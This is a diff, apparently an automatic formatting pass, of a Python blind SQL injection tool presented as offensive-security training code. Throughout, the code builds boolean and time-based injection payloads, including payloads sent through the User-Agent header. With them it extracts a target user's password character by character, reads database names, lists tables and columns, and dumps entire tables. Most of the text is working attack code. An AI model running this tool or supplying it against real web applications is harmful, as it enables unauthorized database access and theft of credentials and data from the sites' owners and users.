@@ -15,12 +15,13 @@ These utilities were developed to support offensive security training, PoC deliv
 Free to use, modify, and share for lawful educational or testing purposes. Attribution required if redistributed.
 """
 
+
 def status_oracle(user, target_url, query, proxies=None):
     payload = quote_plus(f"{user}' AND ({query})-- -")
     r = requests.get(f"{target_url}?u={payload}", proxies=proxies)
     try:
         j = json.loads(r.text)
-        return j['status'] == 'taken'
+        return j["status"] == "taken"
     except json.JSONDecodeError:
         return False
 
@@ -32,13 +33,13 @@ def timing_oracle(query, target_url, delay=3, dbms="mysql", proxies=None):
         payload = f"';IF({query}) WAITFOR DELAY '0:0:{delay}'--"
     elif dbms == "postgresql":
         # PostgreSQL doesn't use WAITFOR or SLEEP in this way inside headers; assume pg_sleep
-        payload = f"';SELECT CASE WHEN {query} THEN pg_sleep({delay}) ELSE pg_sleep(0) END--"
+        payload = (
+            f"';SELECT CASE WHEN {query} THEN pg_sleep({delay}) ELSE pg_sleep(0) END--"
+        )
     else:
         raise ValueError("Unsupported DBMS for timing inference.")
 
-    headers = {
-        "User-Agent": payload
-    }
+    headers = {"User-Agent": payload}
     start = time.time()
     r = requests.get(target_url, headers=headers, proxies=proxies)
     elapsed = time.time() - start
@@ -49,7 +50,7 @@ def dumpNumber(query, oracle_fn):
     value = 0
     for p in range(12):  # allow values up to 4096
         if oracle_fn(f"({query}) & {1 << p} > 0"):
-            value |= (1 << p)
+            value |= 1 << p
     return value
 
 
@@ -83,13 +84,13 @@ def password_length(oracle_fn):
 
 
 def extract_password(pwl, oracle_fn):
-    print("[*] Password = ", end='', flush=True)
+    print("[*] Password = ", end="", flush=True)
     for i in range(1, pwl + 1):
         low, high = 32, 126
         while low <= high:
             mid = (low + high) // 2
             if oracle_fn(f"ASCII(SUBSTRING(password,{i},1))={mid}"):
-                print(chr(mid), end='', flush=True)
+                print(chr(mid), end="", flush=True)
                 break
             elif oracle_fn(f"ASCII(SUBSTRING(password,{i},1))>{mid}"):
                 low = mid + 1
@@ -108,7 +109,7 @@ def guess_char(position, oracle_fn):
             low = mid + 1
         else:
             high = mid - 1
-    return (position, '?')
+    return (position, "?")
 
 
 def extract_password_threaded(pwl, oracle_fn, max_workers=4):
@@ -116,7 +117,7 @@ def extract_password_threaded(pwl, oracle_fn, max_workers=4):
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         futures = [executor.submit(guess_char, i, oracle_fn) for i in range(1, pwl + 1)]
     result = sorted([f.result() for f in futures], key=lambda x: x[0])
-    password = ''.join(char for (_, char) in result)
+    password = "".join(char for (_, char) in result)
     print(f"[*] Password = {password}")
 
 
@@ -157,7 +158,6 @@ def list_tables(db_name, oracle_fn, dbms):
             print(f"[+] Table {i}: {table_name}")
 
 
-
 def list_columns(table, db_name, oracle_fn, dbms):
     if dbms in ["mysql", "postgresql"]:
         count_query = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db_name}'"
@@ -193,7 +193,7 @@ def dump_table(table, db_name, oracle_fn, dbms):
         col_count_query = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}' AND table_catalog='{db_name}'"
     else:
         raise ValueError("Unsupported DBMS")
-    
+
     col_count = dumpNumber(col_count_query, oracle_fn)
     print(f"[*] Number of columns in '{table}': {col_count}")
 
@@ -246,6 +246,7 @@ def get_database_expression(dbms):
     else:
         raise ValueError("Unsupported DBMS")
 
+
 def extract_db_name(oracle_fn, dbms):
     db_expr, db_len_expr = get_database_expression(dbms)
     print("[*] Extracting database name...")
@@ -255,23 +256,64 @@ def extract_db_name(oracle_fn, dbms):
     print(f"[*] Database name: {db_name}")
     return db_name
 
+
 def parse_args():
     parser = argparse.ArgumentParser(description="Blind SQLi automation script")
-    parser.add_argument("--rows", action="store_true", help="Find number of rows in users table")
-    parser.add_argument("--password-length", action="store_true", help="Find password length for user")
-    parser.add_argument("--password", action="store_true", help="Extract password for user")
-    parser.add_argument("--threaded", action="store_true", help="Use threaded password extraction")
-    parser.add_argument("--extract-db-name", action="store_true", help="Dump database name")
-    parser.add_argument("--list-tables", action="store_true", help="List table names in current database")
-    parser.add_argument("--list-columns", metavar="TABLE", help="List column names in specified table")
-    parser.add_argument("--dump-table", metavar="TABLE", help="Dump all rows and columns from specified table")
-    parser.add_argument("--target", required=True, help="Target URL (e.g., http://10.10.10.10/api/check-username.php)")
+    parser.add_argument(
+        "--rows", action="store_true", help="Find number of rows in users table"
+    )
+    parser.add_argument(
+        "--password-length", action="store_true", help="Find password length for user"
+    )
+    parser.add_argument(
+        "--password", action="store_true", help="Extract password for user"
+    )
+    parser.add_argument(
+        "--threaded", action="store_true", help="Use threaded password extraction"
+    )
+    parser.add_argument(
+        "--extract-db-name", action="store_true", help="Dump database name"
+    )
+    parser.add_argument(
+        "--list-tables",
+        action="store_true",
+        help="List table names in current database",
+    )
+    parser.add_argument(
+        "--list-columns", metavar="TABLE", help="List column names in specified table"
+    )
+    parser.add_argument(
+        "--dump-table",
+        metavar="TABLE",
+        help="Dump all rows and columns from specified table",
+    )
+    parser.add_argument(
+        "--target",
+        required=True,
+        help="Target URL (e.g., http://10.10.10.10/api/check-username.php)",
+    )
     parser.add_argument("--user", required=True, help="Target username (e.g., maria)")
     parser.add_argument("--proxies", help="Proxy (e.g., http://127.0.0.1:8080)")
-    parser.add_argument("--use-timing", action="store_true", help="Use timing-based oracle via header injection")
-    parser.add_argument("--delay", type=int, default=3, help="Response delay in seconds for timing inference")
-    parser.add_argument("--dbms", choices=["mysql", "mssql", "postgresql"], default="mysql", help="Database type for timing inference")
-    parser.add_argument("--db-name", help="Manually specify the database name (overrides extraction)")
+    parser.add_argument(
+        "--use-timing",
+        action="store_true",
+        help="Use timing-based oracle via header injection",
+    )
+    parser.add_argument(
+        "--delay",
+        type=int,
+        default=3,
+        help="Response delay in seconds for timing inference",
+    )
+    parser.add_argument(
+        "--dbms",
+        choices=["mysql", "mssql", "postgresql"],
+        default="mysql",
+        help="Database type for timing inference",
+    )
+    parser.add_argument(
+        "--db-name", help="Manually specify the database name (overrides extraction)"
+    )
     return parser.parse_args()
 
 
@@ -280,7 +322,9 @@ def main():
     proxies = {"http": args.proxies, "https": args.proxies} if args.proxies else None
 
     if args.use_timing:
-        oracle_fn = lambda q: timing_oracle(q, args.target, delay=args.delay, dbms=args.dbms, proxies=proxies)
+        oracle_fn = lambda q: timing_oracle(
+            q, args.target, delay=args.delay, dbms=args.dbms, proxies=proxies
+        )
     else:
         oracle_fn = lambda q: status_oracle(args.user, args.target, q, proxies=proxies)
 
@@ -304,7 +348,9 @@ def main():
         extract_password_threaded(length, oracle_fn)
 
     if args.extract_db_name:
-        db_name = extract_db_name(oracle_fn, args.dbms)        # db_name already printed in extract_db_name()
+        db_name = extract_db_name(
+            oracle_fn, args.dbms
+        )  # db_name already printed in extract_db_name()
         pass
 
     if args.list_tables:
@@ -316,6 +362,6 @@ def main():
     if args.dump_table:
         dump_table(args.dump_table, db_name, oracle_fn, args.dbms)
 
+
 if __name__ == "__main__":
     main()
-
